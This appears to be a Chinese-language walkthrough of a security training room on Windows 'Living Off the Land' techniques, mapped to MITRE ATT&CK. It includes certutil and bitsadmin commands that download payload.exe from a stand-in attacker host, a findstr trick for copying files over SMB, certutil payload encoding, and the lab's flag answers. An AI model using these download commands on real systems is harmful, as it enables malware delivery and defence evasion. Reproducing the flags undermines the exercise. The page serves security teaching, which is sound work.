6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用搜索栏查找更多关于 Scriptrunner.exe 的信息。该二进制文件的功能是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Execute</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在接下来的任务中，我们将展示一些基于功能的工具！让我们开始吧！</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="file-operations---文件操作">File Operations - 文件操作<a href="#file-operations---文件操作" class="hash-link" aria-label="Direct link to File Operations - 文件操作" title="Direct link to File Operations - 文件操作">​</a></h2>
<p>此任务展示了基于功能和在真实世界以及红队活动中常见的恶意软件活动的常用工具。</p>
<p>本任务将重点介绍一些有趣的“Living Off the Land”技术，旨在用于文件操作，包括下载、上传和编码。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="certutil">Certutil<a href="#certutil" class="hash-link" aria-label="Direct link to Certutil" title="Direct link to Certutil">​</a></h3>
<p>Certutil 是一个 Windows 内置工具，用于处理证书服务。它用于转储和显示证书授权机构（CA）配置信息及其他 CA 组件。因此，工具的正常用途是检索证书信息。然而，人们发现 certutil.exe 可以用于传输和编码与证书服务无关的文件。MITRE ATT&amp;CK 框架将这一技术标识为 <strong>Ingress 工具传输</strong>（<a href="https://attack.mitre.org/techniques/T1105/" target="_blank" rel="noopener noreferrer">T1105</a>）。</p>
<p>为了通过一个示例说明，我们可以使用 certutil.exe 从攻击者的 Web 服务器下载文件并将其存储在 Windows 临时文件夹中，使用如下命令。请注意，我们使用了 <code>-urlcache</code> 和 <code>-split -f</code> 参数，以强制工具使用分割技术从提供的 URL 下载文件。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>-urlcache 用于显示 URL，启用命令中使用 URL 选项的功能。
-split -f 用于分割并强制从指定的 URL 获取文件。</p>
<p>此外，<code>certutil.exe</code> 还可作为一种编码工具，能够对文件进行编码并解码文件内容。ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener noreferrer">T1027</a> 提及了此技术，可用于混淆文件以增加其发现或分析的难度。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; certutil -encode payload.exe Encoded-payload.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如需了解有关该工具的更多信息，可访问 Microsoft 文档：<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank" rel="noopener noreferrer">Microsoft Docs: CertUtil</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bitsadmin">BITSAdmin<a href="#bitsadmin" class="hash-link" aria-label="Direct link to BITSAdmin" title="Direct link to BITSAdmin">​</a></h3>
<p>BITSAdmin 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务（BITS）任务，并检查其进度。<a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal" target="_blank" rel="noopener noreferrer">BITS</a> 是一种低带宽、异步的方法，用于从 HTTP Web 服务器和 SMB 服务器下载和上传文件。有关 BITSAdmin 工具的更多信息，请参阅 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin" target="_blank" rel="noopener noreferrer">Microsoft Docs</a>。</p>
<p>攻击者可能会滥用 BITS 任务来在受感染的机器上下载并执行恶意载荷。有关此技术的更多信息，请访问 ATT&amp;CK <a href="https://attack.mitre.org/techniques/T1197/" target="_blank" rel="noopener noreferrer">T1197</a> 页面。</p>
<p>介绍终端容器内容（待查）。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt;bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>/Transfer 用于使用传输选项
/Download 指定使用下载类型进行传输
/Priority 设置任务的优先级，使其在前台运行</p>
<p>有关 BITSAdmin 参数的更多信息，请访问该工具的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer" target="_blank" rel="noopener noreferrer">Microsoft 文档</a>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="findstr">FindStr<a href="#findstr" class="hash-link" aria-label="Direct link to FindStr" title="Direct link to FindStr">​</a></h3>
<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr" target="_blank" rel="noopener noreferrer">Findstr</a> 是 Microsoft 内置工具，用于在文件中查找文本和字符串模式。Findstr 工具非常实用，可帮助用户和系统管理员在文件或解析输出中搜索内容。例如，如果我们想检查本机上端口 8080 是否已打开，可以将 <code>netstat</code> 的结果通过管道传递给 <code>findstr</code> 命令来查找该端口，如下所示：<code>netstat -an| findstr &quot;445&quot;</code></p>
<p>然而，发现了一种意想不到的用法，即利用 <code>findstr.exe</code> 从网络中的 SMB 共享文件夹下载远程文件，方法如下：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt;findstr /V dummystring \\MachineName\ShareFolder\test.exe &gt; c:\Windows\Temp\test.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>/V 用于输出不包含指定字符串的行。</p>
<p><code>dummystring</code> 表示要搜索的文本；在本例中，我们提供一个在文件中不应存在的字符串。</p>
<p><code>&gt; c:\Windows\Temp\test.exe</code> 将输出重定向到目标机器上的一个文件。</p>
<p>请注意，还有其他工具可用于文件操作。我们建议访问 <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a> 项目以了解更多工具。</p>
<p>在下一个任务中，我们将介绍一些用于执行文件的工具。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>运行 <code>bitsadmin.exe</code> 将您选择的文件下载到附带的 Windows 虚拟机上。成功执行命令后，桌面上会自动生成一个编码的标志文件。该文件的名称是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">enc_thm_0YmFiOG_file.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用 <code>certutil.exe</code> 工具解码第一个问题中提到的编码标志文件。要解码该文件，我们使用 <code>-decode</code> 选项，如下所示：</p><p><code>C:\Users\thm&gt; certutil -decode Encoded_file payload.txt</code></p><p>解码后的文件内容是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{ea4e2b9f362320d098635d4bab8a568e}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="file-execution---文件执行">File Execution - 文件执行<a href="#file-execution---文件执行" class="hash-link" aria-label="Direct link to File Execution - 文件执行" title="Direct link to File Execution - 文件执行">​</a></h2>
<p>此任务展示了在操作系统中执行二进制文件的各种方式。执行二进制文件的典型方法涉及使用命令行 <code>cmd.exe</code> 或通过桌面。然而，还有其他方法可以通过滥用系统中的其他二进制文件来实现有效载荷的执行，原因之一是为了隐藏或加固有效载荷的进程。根据 MITRE ATT&amp;CK 框架，这种技术被称为 <strong>签名二进制代理执行</strong> 或 <strong>间接命令执行</strong>，攻击者通过利用其他系统工具来启动恶意有效载荷。这种技术也有助于规避防御控制。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="文件资源管理器">文件资源管理器<a href="#文件资源管理器" class="hash-link" aria-label="Direct link to 文件资源管理器" title="Direct link to 文件资源管理器">​</a></h3>
<p><img decoding="async" loading="lazy" alt=" " src="data:image/png;base64,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